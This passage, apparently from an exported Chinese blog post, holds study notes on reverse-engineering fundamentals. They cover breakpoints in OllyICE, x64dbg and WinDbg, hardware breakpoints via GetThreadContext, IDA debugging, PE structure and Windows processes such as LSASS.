data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221112211213663.png\" alt=\"image-20221112211213663\"></p>\n<p>取消硬件断点：  hd 基址</p>\n<p>对当前地址做中断，即添加硬件断点： hr 基址</p>\n<p>常用断点：软件断点，内存写入，内存访问，硬件执行</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1655192756712-0636b463-746a-4c86-8b38-44b2bb9597c5.png\" alt=\"img\"></p>\n<p>ALT+M 内存镜像</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1655192833816-1b08c4ac-e51c-419e-906d-f288dd1d9a22.png\" alt=\"img\"></p>\n<h3 id=\"常用调试器\"><a class=\"markdownIt-Anchor\" href=\"#常用调试器\">#</a> 常用调试器</h3>\n<h4 id=\"ollyice\"><a class=\"markdownIt-Anchor\" href=\"#ollyice\">#</a> OllyICE</h4>\n<p>查看在内存在对应的字节码，即指令在内存中的机器码</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1655194426316-532565d9-fa78-44e2-b792-c1d4f47c3c65.png\" alt=\"img\"></p>\n<p>一般来说程序映射到内存中基址从 0040 开始，即 PE 文件头</p>\n<p>映射到代码段需要 + 1000，前 1000 是 PE 头信息</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1655194544858-688f3db0-11f9-4a14-b509-46464ef0c7e3.png\" alt=\"img\"></p>\n<p>8087 中浮点运行，反调试会用到</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221112214201466.png\" alt=\"image-20221112214201466\"></p>\n<p>用于轴坐标，准心，多用于游戏分析</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221112214252305.png\" alt=\"image-20221112214252305\"></p>\n<h4 id=\"xdbg\"><a class=\"markdownIt-Anchor\" href=\"#xdbg\">#</a> xdbg</h4>\n<p>1. 线程</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221112214836603.png\" alt=\"image-20221112214836603\"></p>\n<p>stdcall 一般在函数内部做 ret 做堆栈平衡</p>\n<p>windbg</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:004&gt; g</span><br><span class=\"line\">(a5c.9dc): Break instruction exception - code 80000003 (first chance)</span><br><span class=\"line\">eax=7efda000 ebx=00000000 ecx=00000000 edx=77a4f7ea esi=00000000 edi=00000000</span><br><span class=\"line\">eip=779c000c esp=02adff5c ebp=02adff88 iopl=0         nv up ei pl zr na pe nc</span><br><span class=\"line\">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246</span><br><span class=\"line\">ntdll!DbgBreakPoint:</span><br><span class=\"line\">779c000c cc              int     3</span><br><span class=\"line\">0:004&gt; bp kernel32!OpenProcess</span><br><span class=\"line\">0:004&gt; u kernel32!OpenProcess</span><br><span class=\"line\">kernel32!OpenProcess:</span><br><span class=\"line\">76831986 8bff            mov     edi,edi</span><br><span class=\"line\">76831988 55              push    ebp</span><br><span class=\"line\">76831989 8bec            mov     ebp,esp</span><br><span class=\"line\">7683198b 5d              pop     ebp</span><br><span class=\"line\">7683198c eb05            jmp     kernel32!OpenProcess+0xd (76831993)</span><br><span class=\"line\">7683198e 90              nop</span><br><span class=\"line\">7683198f 90              nop</span><br><span class=\"line\">76831990 90              nop</span><br><span class=\"line\">0:004&gt; u 76831993</span><br><span class=\"line\">kernel32!OpenProcess+0xd:</span><br><span class=\"line\">76831993 ff2554098376    jmp     dword ptr [kernel32+0x10954 (76830954)]</span><br><span class=\"line\">76831999 90              nop</span><br><span class=\"line\">7683199a 90              nop</span><br><span class=\"line\">7683199b 90              nop</span><br><span class=\"line\">7683199c 90              nop</span><br><span class=\"line\">7683199d 90              nop</span><br><span class=\"line\">kernel32!WaitForMultipleObjectsEx:</span><br><span class=\"line\">7683199e 8bff            mov     edi,edi</span><br><span class=\"line\">768319a0 55              push    ebp</span><br></pre></td></tr></table></figure>\n<p>VT</p>\n<p>需要开启</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221113204110511.png\" alt=\"image-20221113204110511\"></p>\n<h2 id=\"动态调试基础二\"><a class=\"markdownIt-Anchor\" href=\"#动态调试基础二\">#</a> 动态调试基础二</h2>\n<p>ALT+F9  返回调用本函数的函数的代码</p>\n<p>rpb radmin.rpb 存在 127.0.0.1 的配置信息</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221116181239485.png\" alt=\"image-20221116181239485\" style=\"zoom:67%;\" />\n<h3 id=\"硬件断点\"><a class=\"markdownIt-Anchor\" href=\"#硬件断点\">#</a> 硬件断点</h3>\n<ol>\n<li>Intel 80306 以上的 CPU 给我们提供了调试寄存器用于软件调试，硬件断点是通过设置调试寄存器实现的。</li>\n</ol>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221116183140142.png\" alt=\"image-20221116183140142\"></p>\n<p>调试时线程挂起</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221116183413279.png\" alt=\"image-20221116183413279\"></p>\n<p>右键 resume all 激活</p>\n<p>实现硬件断点，首先要获取当前线程环境</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//获取线程环境</span></span><br><span class=\"line\">CONTEXT g_Context = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">g_Context.ContextFlags = CONTEXT_CONTROL;</span><br><span class=\"line\"><span class=\"built_in\">GetThreadContext</span>(hThread, &amp;g_Context);</span><br></pre></td></tr></table></figure>\n<p>在 CONTEXT 结构体中，存放了诸多当前线程环境的信息</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221116184014697.png\" alt=\"image-20221116184014697\" style=\"zoom:67%;\" />\n<h2 id=\"ida动态分析基础\"><a class=\"markdownIt-Anchor\" href=\"#ida动态分析基础\">#</a> IDA 动态分析基础</h2>\n<p>导入表：编译时倒入，通过静态链接到输入表</p>\n<p>1.debug -&gt; local 32 debug</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221117210719141.png\" alt=\"image-20221117210719141\"></p>\n<p>IDA 远程调试</p>\n<p>将 dbgsrv 放到要调试的文件夹中</p>\n<h2 id=\"pe文件结构\"><a class=\"markdownIt-Anchor\" href=\"#pe文件结构\">#</a> PE 文件结构</h2>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221119190434856.png\" alt=\"image-20221119190434856\"></p>\n<h2 id=\"windows系统安全基础\"><a class=\"markdownIt-Anchor\" href=\"#windows系统安全基础\">#</a> Windows 系统安全基础</h2>\n<p>进程句柄表</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/563d88364cb24f768722413a352523a4.png\" alt=\"img\"></p>\n<p>当你输入用户名和口令时，Winlogon 将其发送给一个叫做 LSASS 的子进程。如果你执行对服务器或工作站的本地登录，LSASS 进程将在安全数据库（亦即 SAM）中查对有关用户名和口令。Winlogon 有两个子进程，即服务控制器和 LSASS。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120184811911.png\" alt=\"image-20221120184811911\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120184825383.png\" alt=\"image-20221120184825383\"></p>\n<p>Explorer 进程 在 Windows 系列的操作系统中，运行时都会启动一个名为 Explorer.exe 的进程。这个进程主要负责显示系统桌面上的图标以及任务栏。</p>\n",
            "tags": [
                "逆向"
            ]
        }
    ]
}